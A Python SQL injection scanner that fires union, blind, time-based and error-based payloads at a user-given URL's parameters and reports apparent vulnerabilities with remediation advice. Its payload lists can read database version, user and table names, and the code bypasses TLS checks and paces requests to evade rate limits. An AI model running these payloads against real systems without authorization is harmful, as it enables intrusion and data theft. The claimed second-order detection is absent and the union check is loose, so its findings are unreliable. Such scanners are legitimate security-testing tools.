#!/usr/bin/env python3
"""
Advanced SQL Injection Scanner

Author: LakshmiKanthanK(letchupkt)
Portfolio: https://letchupkt.vgrow.tech

This tool performs comprehensive SQL injection testing including:
- Union-based SQL injection
- Boolean-based blind SQL injection
- Time-based blind SQL injection
- Error-based SQL injection
- Second-order SQL injection detection
"""

import requests
import time
import re
import random
import argparse
import json
from urllib.parse import urlencode, urlparse, parse_qs
from typing import List, Dict, Any
import urllib3

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class SQLInjectionScanner:
    def __init__(self, target_url: str, timeout: int = 10):
        self.target_url = target_url
        self.timeout = timeout
        self.session = requests.Session()
        self.vulnerabilities = []
        
        # Configure session
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        
        # SQL injection payloads by type
        self.payloads = {
            'union_based': [
                "' UNION SELECT NULL--",
                "' UNION SELECT NULL,NULL--",
                "' UNION SELECT NULL,NULL,NULL--",
                "' UNION SELECT 1,2,3--",
                "' UNION SELECT version(),database(),user()--",
                "' UNION SELECT table_name FROM information_schema.tables--",
                "') UNION SELECT NULL--",
                "\") UNION SELECT NULL--"
            ],
            
            'boolean_blind': [
                "' AND '1'='1",
                "' AND '1'='2",
                "' AND 1=1--",
                "' AND 1=2--",
                "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
                "' AND (SELECT LENGTH(database()))>0--",
                "') AND ('1'='1",
                "') AND ('1'='2"
            ],
            
            'time_based': [
                "' AND SLEEP(5)--",
                "' AND (SELECT SLEEP(5))--",
                "'; SELECT pg_sleep(5)--",
                "'; WAITFOR DELAY '00:00:05'--",
                "' AND IF(1=1,SLEEP(5),0)--",
                "') AND SLEEP(5)--",
                "\") AND SLEEP(5)--"
            ],
            
            'error_based': [
                "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
                "' AND ExtractValue(1,CONCAT(0x7e,(SELECT database()),0x7e))--",
                "' AND UpdateXML(1,CONCAT(0x7e,(SELECT user()),0x7e),1)--",
                "' AND CAST((SELECT version()) AS int)--",
                "' AND CONVERT(int,(SELECT @@version))--"
            ],
            
            'basic_tests': [
                "'",
                "\"",
                "`",
                "';",
                "\";",
                "`;",
                "' OR '1'='1",
                "\" OR \"1\"=\"1",
                "' OR 1=1--",
                "\" OR 1=1--"
            ]
        }
        
        # Database error patterns
        self.error_patterns = [
            # MySQL
            r"SQL syntax.*MySQL",
            r"Warning.*mysql_.*",
            r"valid MySQL result",
            r"MySqlClient\.",
            
            # PostgreSQL
            r"PostgreSQL.*ERROR",
            r"Warning.*pg_.*",
            r"valid PostgreSQL result",
            r"Npgsql\.",
            
            # SQL Server
            r"Driver.* SQL[\-\_\ ]*Server",
            r"OLE DB.* SQL Server",
            r"(\W|\A)SQL Server.*Driver",
            r"Warning.*mssql_.*",
            r"(\W|\A)SQL Server.*[0-9a-fA-F]{8}",
            r"Exception.*\WSystem\.Data\.SqlClient\.",
            
            # Oracle
            r"ORA-[0-9][0-9][0-9][0-9]",
            r"Oracle error",
            r"Oracle.*Driver",
            r"Warning.*oci_.*",
            
            # Generic
            r"SQL command not properly ended",
            r"Query failed",
            r"SQLException",
            r"Database error",
            r"Invalid query"
        ]
    
    def scan_url(self, url: str, method: str = 'GET', data: dict = None) -> List[Dict[str, Any]]:
        """Scan a URL for SQL injection vulnerabilities"""
        print(f"[*] Scanning {url} using {method} method")
        
        vulnerabilities = []
        
        if method.upper() == 'GET':
            vulnerabilities.extend(self.scan_get_parameters(url))
        elif method.upper() == 'POST':
            vulnerabilities.extend(self.scan_post_parameters(url, data or {}))
        
        return vulnerabilities
    
    def scan_get_parameters(self, url: str) -> List[Dict[str, Any]]:
        """Scan GET parameters for SQL injection"""
        vulnerabilities = []
        parsed_url = urlparse(url)
        parameters = parse_qs(parsed_url.query)
        
        for param_name, param_values in parameters.items():
            if param_values:
                print(f"[*] Testing parameter: {param_name}")
                param_vulns = self.test_parameter(url, param_name, 'GET')
                vulnerabilities.extend(param_vulns)
        
        return vulnerabilities
    
    def scan_post_parameters(self, url: str, data: dict) -> List[Dict[str, Any]]:
        """Scan POST parameters for SQL injection"""
        vulnerabilities = []
        
        for param_name in data.keys():
            print(f"[*] Testing POST parameter: {param_name}")
            param_vulns = self.test_parameter(url, param_name, 'POST', data)
            vulnerabilities.extend(param_vulns)
        
        return vulnerabilities
    
    def test_parameter(self, url: str, parameter: str, method: str, data: dict = None) -> List[Dict[str, Any]]:
        """Test a specific parameter for SQL injection"""
        vulnerabilities = []
        
        # Test different payload types
        for payload_type, payloads in self.payloads.items():
            print(f"[*] Testing {payload_type} payloads on {parameter}")
            
            for payload in payloads:
                try:
                    vuln = self.test_payload(url, parameter, payload, method, data, payload_type)
                    if vuln:
                        vulnerabilities.append(vuln)
                        print(f"[+] {payload_type.upper()} SQL injection found in {parameter}")
                        break  # Found vulnerability, move to next type
                    
                    # Add delay to avoid rate limiting
                    time.sleep(random.uniform(0.5, 1.5))
                    
                except Exception as e:
                    print(f"[!] Error testing payload: {e}")
                    continue
        
        return vulnerabilities
    
    def test_payload(self, url: str, parameter: str, payload: str, method: str, 
                    data: dict = None, payload_type: str = 'unknown') -> Dict[str, Any]:
        """Test a single payload"""
        
        if method.upper() == 'GET':
            return self.test_get_payload(url, parameter, payload, payload_type)
        elif method.upper() == 'POST':
            return self.test_post_payload(url, parameter, payload, data or {}, payload_type)
    
    def test_get_payload(self, url: str, parameter: str, payload: str, payload_type: str) -> Dict[str, Any]:
        """Test GET payload"""
        try:
            # Parse URL and modify parameter
            parsed_url = urlparse(url)
            params = parse_qs(parsed_url.query)
            
            # Inject payload
            if parameter in params:
                original_value = params[parameter][0] if params[parameter] else ''
                params[parameter] = [original_value + payload]
            else:
                params[parameter] = [payload]
            
            # Reconstruct URL
            new_query = urlencode(params, doseq=True)
            test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{new_query}"
            
            # Send request
            start_time = time.time()
            response = self.session.get(test_url, timeout=self.timeout, verify=False)
            response_time = time.time() - start_time
            
            # Analyze response
            return self.analyze_response(response, response_time, payload, parameter, 
                                       'GET', test_url, payload_type)
            
        except Exception as e:
            print(f"[!] Error in GET request: {e}")
            return None
    
    def test_post_payload(self, url: str, parameter: str, payload: str, 
                         data: dict, payload_type: str) -> Dict[str, Any]:
        """Test POST payload"""
        try:
            # Prepare POST data
            test_data = data.copy()
            
            if parameter in test_data:
                original_value = test_data[parameter]
                test_data[parameter] = str(original_value) + payload
            else:
                test_data[parameter] = payload
            
            # Send request
            start_time = time.time()
            response = self.session.post(url, data=test_data, timeout=self.timeout, verify=False)
            response_time = time.time() - start_time
            
            # Analyze response
            return self.analyze_response(response, response_time, payload, parameter, 
                                       'POST', url, payload_type)
            
        except Exception as e:
            print(f"[!] Error in POST request: {e}")
            return None
    
    def analyze_response(self, response: requests.Response, response_time: float, 
                        payload: str, parameter: str, method: str, url: str, 
                        payload_type: str) -> Dict[str, Any]:
        """Analyze response for SQL injection indicators"""
        
        # Time-based detection
        if payload_type == 'time_based' and response_time > 4:
            return {
                'type': 'Time-based Blind SQL Injection',
                'severity': 'High',
                'parameter': parameter,
                'method': method,
                'payload': payload,
                'url': url,
                'response_time': response_time,
                'evidence': f'Response time: {response_time:.2f} seconds',
                'description': 'Application vulnerable to time-based blind SQL injection'
            }
        
        # Error-based detection
        if self.detect_sql_error(response.text):
            error_evidence = self.extract_error_evidence(response.text)
            return {
                'type': 'Error-based SQL Injection',
                'severity': 'High',
                'parameter': parameter,
                'method': method,
                'payload': payload,
                'url': url,
                'status_code': response.status_code,
                'evidence': error_evidence,
                'description': 'Application vulnerable to error-based SQL injection'
            }
        
        # Union-based detection (simplified)
        if payload_type == 'union_based' and self.detect_union_success(response.text, payload):
            return {
                'type': 'Union-based SQL Injection',
                'severity': 'Critical',
                'parameter': parameter,
                'method': method,
                'payload': payload,
                'url': url,
                'status_code': response.status_code,
                'evidence': 'Union query executed successfully',
                'description': 'Application vulnerable to union-based SQL injection'
            }
        
        # Boolean-based detection (requires baseline comparison)
        if payload_type == 'boolean_blind':
            return self.test_boolean_blind(url, parameter, method, response)
        
        return None
    
    def detect_sql_error(self, response_text: str) -> bool:
        """Detect SQL error patterns in response"""
        for pattern in self.error_patterns:
            if re.search(pattern, response_text, re.IGNORECASE):
                return True
        return False
    
    def extract_error_evidence(self, response_text: str) -> str:
        """Extract SQL error evidence from response"""
        for pattern in self.error_patterns:
            match = re.search(pattern, response_text, re.IGNORECASE)
            if match:
                # Extract surrounding context
                start = max(0, match.start() - 100)
                end = min(len(response_text), match.end() + 100)
                return response_text[start:end].strip()
        return "SQL error detected"
    
    def detect_union_success(self, response_text: str, payload: str) -> bool:
        """Detect successful union injection"""
        # Look for common union injection success indicators
        union_indicators = [
            'mysql',
            'version()',
            'database()',
            'information_schema',
            'table_name',
            'column_name'
        ]
        
        response_lower = response_text.lower()
        return any(indicator in response_lower for indicator in union_indicators)
    
    def test_boolean_blind(self, url: str, parameter: str, method: str, 
                          response: requests.Response) -> Dict[str, Any]:
        """Test for boolean-based blind SQL injection"""
        try:
            # This is a simplified implementation
            # In practice, you'd need to compare true/false conditions
            
            true_payload = "' AND '1'='1"
            false_payload = "' AND '1'='2"
            
            # Test true condition
            true_response = self.send_test_request(url, parameter, true_payload, method)
            # Test false condition  
            false_response = self.send_test_request(url, parameter, false_payload, method)
            
            if (true_response and false_response and 
                len(true_response.text) != len(false_response.text)):
                
                return {
                    'type': 'Boolean-based Blind SQL Injection',
                    'severity': 'High',
                    'parameter': parameter,
                    'method': method,
                    'payload': true_payload,
                    'url': url,
                    'evidence': f'True condition length: {len(true_response.text)}, False condition length: {len(false_response.text)}',
                    'description': 'Application vulnerable to boolean-based blind SQL injection'
                }
            
        except Exception as e:
            print(f"[!] Error in boolean blind test: {e}")
        
        return None
    
    def send_test_request(self, url: str, parameter: str, payload: str, method: str) -> requests.Response:
        """Send a test request with payload"""
        try:
            if method.upper() == 'GET':
                parsed_url = urlparse(url)
                params = parse_qs(parsed_url.query)
                params[parameter] = [payload]
                new_query = urlencode(params, doseq=True)
                test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{new_query}"
                return self.session.get(test_url, timeout=self.timeout, verify=False)
            
            elif method.upper() == 'POST':
                data = {parameter: payload}
                return self.session.post(url, data=data, timeout=self.timeout, verify=False)
                
        except Exception as e:
            print(f"[!] Error sending test request: {e}")
            return None
    
    def generate_report(self) -> dict:
        """Generate comprehensive scan report"""
        report = {
            'target_url': self.target_url,
            'scan_time': time.strftime('%Y-%m-%d %H:%M:%S'),
            'total_vulnerabilities': len(self.vulnerabilities),
            'vulnerabilities': self.vulnerabilities,
            'risk_assessment': self.calculate_risk_level(),
            'recommendations': self.get_recommendations()
        }
        
        return report
    
    def calculate_risk_level(self) -> str:
        """Calculate overall risk level"""
        if not self.vulnerabilities:
            return 'Low'
        
        critical_count = sum(1 for v in self.vulnerabilities if v.get('severity') == 'Critical')
        high_count = sum(1 for v in self.vulnerabilities if v.get('severity') == 'High')
        
        if critical_count > 0:
            return 'Critical'
        elif high_count > 0:
            return 'High'
        else:
            return 'Medium'
    
    def get_recommendations(self) -> List[str]:
        """Get security recommendations"""
        recommendations = [
            'Use parameterized queries (prepared statements)',
            'Implement input validation and sanitization',
            'Apply principle of least privilege for database accounts',
            'Enable database query logging and monitoring',
            'Regular security testing and code reviews',
            'Keep database software updated',
            'Implement Web Application Firewall (WAF)'
        ]
        
        return recommendations

def main():
    parser = argparse.ArgumentParser(description='Advanced SQL Injection Scanner')
    parser.add_argument('-u', '--url', required=True, help='Target URL')
    parser.add_argument('-m', '--method', default='GET', choices=['GET', 'POST'], help='HTTP method')
    parser.add_argument('-d', '--data', help='POST data (key=value&key2=value2)')
    parser.add_argument('-p', '--parameter', help='Specific parameter to test')
    parser.add_argument('-o', '--output', help='Output file for results')
    parser.add_argument('-j', '--json', help='JSON output file')
    parser.add_argument('--timeout', type=int, default=10, help='Request timeout')
    
    args = parser.parse_args()
    
    # Initialize scanner
    scanner = SQLInjectionScanner(args.url, args.timeout)
    
    # Prepare POST data if provided
    post_data = {}
    if args.data:
        for pair in args.data.split('&'):
            if '=' in pair:
                key, value = pair.split('=', 1)
                post_data[key] = value
    
    # Start scanning
    print(f"[*] Starting SQL injection scan on {args.url}")
    start_time = time.time()
    
    vulnerabilities = scanner.scan_url(args.url, args.method, post_data)
    scanner.vulnerabilities = vulnerabilities
    
    end_time = time.time()
    
    # Display results
    print(f"\n[*] Scan completed in {end_time - start_time:.2f} seconds")
    print(f"[*] Found {len(vulnerabilities)} SQL injection vulnerabilities:")
    print("-" * 60)
    
    for i, vuln in enumerate(vulnerabilities, 1):
        print(f"\n{i}. {vuln['type']}")
        print(f"   Severity: {vuln['severity']}")
        print(f"   Parameter: {vuln['parameter']}")
        print(f"   Method: {vuln['method']}")
        print(f"   Payload: {vuln['payload']}")
        print(f"   Evidence: {vuln['evidence']}")
    
    # Generate and save report
    if args.json:
        report = scanner.generate_report()
        try:
            with open(args.json, 'w') as f:
                json.dump(report, f, indent=2)
            print(f"\n[*] Detailed report saved to {args.json}")
        except Exception as e:
            print(f"[!] Error saving report: {e}")
    
    # Save simple results
    if args.output:
        try:
            with open(args.output, 'w') as f:
                for vuln in vulnerabilities:
                    f.write(f"{vuln['type']} - {vuln['parameter']} - {vuln['payload']}\n")
            print(f"[*] Results saved to {args.output}")
        except Exception as e:
            print(f"[!] Error saving results: {e}")

if __name__ == "__main__":
    main()